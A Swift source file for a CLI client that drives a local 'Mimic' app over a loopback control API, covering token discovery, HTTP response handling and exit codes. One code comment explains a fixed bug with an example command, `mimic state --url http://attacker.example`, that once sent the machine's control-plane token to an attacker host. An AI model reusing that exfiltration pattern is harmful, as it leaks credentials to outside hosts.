import Domain
import Foundation
#if canImport(FoundationNetworking)
// URLSession lives in FoundationNetworking on Linux, not Foundation. Without this the CLI and the
// tests that speak HTTP do not compile there — and CI runs on Linux.
import FoundationNetworking
#endif

/// Talks to a running Mimic over the loopback control API.
///
/// The CLI is a *client only* — it holds no state, no database, and no server. That is what makes it
/// safe for an agent to call from anywhere: every invocation reads and writes the one live instance,
/// so two commands issued a second apart cannot disagree about the world.
public struct ControlClient: Sendable {

    public let baseURL: URL
    /// The instance's token, read from its discovery file or the environment.
    ///
    /// Internal rather than private so the discovery tests can assert *where a token did and did not
    /// go*, which is the whole of the property worth testing. It stays out of the public surface and
    /// out of every rendered string: a token echoed into an error ends up in terminal scrollback, CI
    /// logs and bug reports.
    let token: String?
    private let exchange: ControlHTTPExchange

    /// The production initialiser, which owns the one `URLSession` this client uses.
    public init(baseURL: URL, timeout: TimeInterval = 30, token: String? = nil) {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.timeoutIntervalForRequest = timeout
        configuration.timeoutIntervalForResource = timeout
        configuration.requestCachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        let session = URLSession(configuration: configuration)
        // One session, captured once and reused by both `send` and `isReachable`, exactly as the
        // stored property it replaces was.
        self.init(baseURL: baseURL, token: token, exchange: { try await session.data(for: $0) })
    }

    /// The seam under the transport: everything above `exchange` — building the request, attaching
    /// the token, and the five ways `send` can read a reply — is reachable from a test through this.
    ///
    /// Deliberately not the initialiser production calls. `init(baseURL:timeout:token:)` still builds
    /// the same ephemeral session with the same three settings it always did, so nothing about a real
    /// invocation changes shape.
    public init(baseURL: URL, token: String? = nil, exchange: @escaping ControlHTTPExchange) {
        self.baseURL = baseURL
        self.token = token
        self.exchange = exchange
    }

    /// Resolves how to reach an instance: an explicit URL, then the environment, then the discovery
    /// file. Fails with actionable advice rather than a connection error, because "nothing is running"
    /// is by far the most common reason a command cannot proceed.
    ///
    /// The reader is `ControlEndpointDiscovery` in `Domain` — the one implementation of the
    /// discovery contract, shared with the control plane's write side. The CLI used to carry a copy
    /// of its own, and the copy had drifted: it did not honour `MIMIC_CONTROL_FILE`, so an isolated
    /// run's `mimic` went looking for the developer's real instance. `environment` is threaded into
    /// the file search for exactly that reason — the same dictionary decides the destination, the
    /// credential, *and* which file advertises them.
    ///
    /// `discovered` is a parameter so a test can name the file this resolution sees. Left `nil` — as
    /// every production caller leaves it — it reads the search paths the environment names.
    public static func discover(
        explicitURL: String? = nil,
        environment: [String: String] = ProcessInfo.processInfo.environment,
        timeout: TimeInterval = 30,
        discovered: ControlEndpoint? = nil
    ) throws -> ControlClient {
        let endpoint = discovered ?? ControlEndpointDiscovery.discover(environment: environment)
        guard let url = ControlEndpointDiscovery.resolveBaseURL(
            explicit: explicitURL,
            environment: environment,
            discovered: endpoint
        ) else {
            throw CLIFailure.noInstance
        }
        return ControlClient(
            baseURL: url,
            timeout: timeout,
            // Destination and credential decided *together*, which is the whole of the fix. They
            // used to be resolved independently — `resolveBaseURL` returns an explicit `--url`
            // verbatim, `resolveToken` fell back to the local instance's `control.json` — so
            // `mimic state --url http://attacker.example` posted this machine's live control-plane
            // token to that host. See `ControlEndpointDiscovery.namesDiscoveredInstance`.
            token: ControlEndpointDiscovery.resolveToken(
                environment: environment,
                discovered: ControlEndpointDiscovery.namesDiscoveredInstance(url, endpoint)
                    ? endpoint
                    : nil
            )
        )
    }

    public func send(_ command: ControlCommand) async throws -> ControlResponse {
        var request = URLRequest(url: baseURL.appendingPathComponent("\(ControlAPI.version)/command"))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        authorize(&request)
        request.httpBody = try ControlCoding.encoder().encode(command)

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await exchange(request)
        } catch {
            throw CLIFailure.unreachable(baseURL: baseURL, underlying: error.localizedDescription)
        }

        // The envelope first, whatever the status. Mimic answers a refusal with the same
        // `ControlResponse` it answers a success with — a `401` carries `request.unauthorized`, a
        // `409` carries `project.noneOpen` — and that error names the problem far better than a bare
        // status number does. `Output.emit` turns `ok: false` into `.commandFailed`, which exits 4,
        // the code docs/CLI.md pins for "Mimic refused it".
        //
        // This `try?` is a *format probe*, and it is only sound because `ControlResponse.ok` is a
        // non-optional `Bool` on a synthesized decoder: a reply without it cannot decode, so a
        // success here really is evidence the body is an envelope. A probe into an all-Optional type
        // proves nothing — see `ProjectCommand.Import` and `JourneyFile.readSpec`, both of which
        // were accepting the wrong document for exactly that reason. If `ok` ever gains a fallback,
        // this needs a discriminator of its own.
        if let decoded = try? ControlCoding.decode(ControlResponse.self, from: data) {
            return decoded
        }

        // Nothing usable came back — and until now the status was thrown away on the way in, as
        // `(data, _)`. So *everything* that answered on this port without speaking Mimic's envelope
        // arrived as "Unexpected response from Mimic: …": a proxy's `401`, an nginx `502` page, a
        // captive portal's login HTML. That message reads as a decoding bug in this CLI and sends
        // whoever hit it hunting through the wrong module, when the reply had already said exactly
        // what was wrong. The status is the one thing that separates "we were refused" from "the
        // answer was gibberish", so it gets read rather than discarded.
        let status = (response as? HTTPURLResponse)?.statusCode
        if status == 401 {
            // Mimic's own wording, because the advice does not depend on who sent the 401: the token
            // is missing or wrong, and the CLI normally reads it out of the instance's control.json.
            // That message names the file and never the value — a token echoed into an error ends up
            // in terminal scrollback, CI logs and bug reports.
            throw CLIFailure.commandFailed(.unauthorized)
        }
        if let status, status < 200 || status >= 300 {
            throw CLIFailure.commandFailed(.invalid(
                "\(baseURL.absoluteString) answered HTTP \(status) with a body this CLI could not "
                    + "read: \(String(decoding: data, as: UTF8.self))",
                code: "http.\(status)"
            ))
        }
        // A 2xx this CLI cannot read really is a decoding problem, and stays one.
        throw CLIFailure.undecodable(String(decoding: data, as: UTF8.self))
    }

    /// True when an instance answers. Used by `mimic app start` to wait for readiness rather than
    /// sleeping a guessed number of seconds.
    ///
    /// A `401` counts as reachable: the instance is up and serving, and reporting "not running" for
    /// what is really a token mismatch would send the user off restarting an app that is already fine.
    /// `send` will then fail with the message that names the actual problem.
    public func isReachable() async -> Bool {
        var request = URLRequest(url: baseURL.appendingPathComponent("\(ControlAPI.version)/health"))
        request.httpMethod = "GET"
        request.timeoutInterval = 2
        authorize(&request)
        do {
            let (_, response) = try await exchange(request)
            let status = (response as? HTTPURLResponse)?.statusCode
            return status == 200 || status == 401
        } catch {
            return false
        }
    }

    private func authorize(_ request: inout URLRequest) {
        guard let token else { return }
        request.setValue(token, forHTTPHeaderField: ControlAPI.tokenHeaderName)
    }
}

/// One HTTP exchange: hand over a request, get the body and the response back.
///
/// A closure rather than a second protocol, matching how this codebase already injects the one
/// piece a test needs to replace — `ControlEndpointDiscovery.discover(isProcessAlive:)` and
/// `ProjectStore.open(makeOnDisk:makeInMemory:)` are the same shape. It is the narrowest thing that
/// can be substituted to reach `ControlClient.send`'s branches, and it is below all of them, so the
/// decode logic under test is the real one rather than a reimplementation.
public typealias ControlHTTPExchange = @Sendable (URLRequest) async throws -> (Data, URLResponse)

/// `ControlClient` is the production conformance, and the only one that speaks HTTP.
///
/// The three members are already exactly what the protocol asks for, which is the point: the seam was
/// added around the type rather than through it, so no production call path changed on the way in.
extension ControlClient: ControlTransport {}

/// Failures that belong to the CLI itself rather than to a command.
public enum CLIFailure: Error, LocalizedError, Equatable {
    case noInstance
    case unreachable(baseURL: URL, underlying: String)
    case undecodable(String)
    case commandFailed(ControlError)
    case badArgument(String)
    case fileUnreadable(path: String, underlying: String)
    /// The local Mimic itself is not usable: not installed where the CLI looked, would not launch, or
    /// the process a discovery file names could not be confirmed or signalled. Nothing the caller
    /// typed is wrong, and no command ever reached an instance.
    case appUnavailable(String)

    public var errorDescription: String? {
        switch self {
        case .noInstance:
            """
            No running Mimic found.
            Start one with `mimic app start` (the GUI) or `mimic daemon start` (headless),
            or point at an instance with MIMIC_CONTROL_URL or --url.
            """
        case let .unreachable(baseURL, underlying):
            "Could not reach Mimic at \(baseURL.absoluteString): \(underlying)"
        case let .undecodable(payload):
            "Unexpected response from Mimic: \(payload)"
        case let .commandFailed(error):
            "\(error.code): \(error.message)"
        case let .badArgument(message):
            message
        case let .fileUnreadable(path, underlying):
            "Could not read \(path): \(underlying)"
        case let .appUnavailable(message):
            message
        }
    }

    /// Exit codes are part of the contract: a script branches on them without parsing output.
    /// `2` means "the command was wrong", `3` means "no instance", `4` means "the command failed".
    ///
    /// Two of these used to sit on the wrong side of that line, in opposite directions. A path the
    /// caller mistyped never leaves the process, so `fileUnreadable` cannot be "Mimic refused it" —
    /// it is the same kind of mistake as a missing selector, and exits 2. A reply this CLI could not
    /// decode is the reverse: the arguments were fine and Mimic answered, just not with anything
    /// usable, so reporting it as bad usage sent a script looking at its own command line.
    ///
    /// `appUnavailable` is the third, and it was the loudest of them. "Could not find Mimic.app.
    /// Looked in: …" and "Could not stop pid N: …" were both `badArgument`, so a script branching on
    /// the code was told the user had mistyped something when what had happened was that Mimic was
    /// not installed, or that the process the discovery file named was gone. It joins `noInstance`
    /// and `unreachable` at `3` rather than claiming a fifth code, because `3` already means "there
    /// is no Mimic to talk to" and these are that same sentence about the world — and because inside
    /// one command, `mimic app start`, the app-was-not-found failure and the app-never-answered
    /// failure (`waitForReadiness`, already `3`) are one condition that was being reported under two
    /// codes. The contract stays at four documented values, so no caller's existing branch has to
    /// learn a new one.
    public var exitCode: Int32 {
        switch self {
        case .badArgument, .fileUnreadable: 2
        case .noInstance, .unreachable, .appUnavailable: 3
        case .commandFailed, .undecodable: 4
        }
    }
}
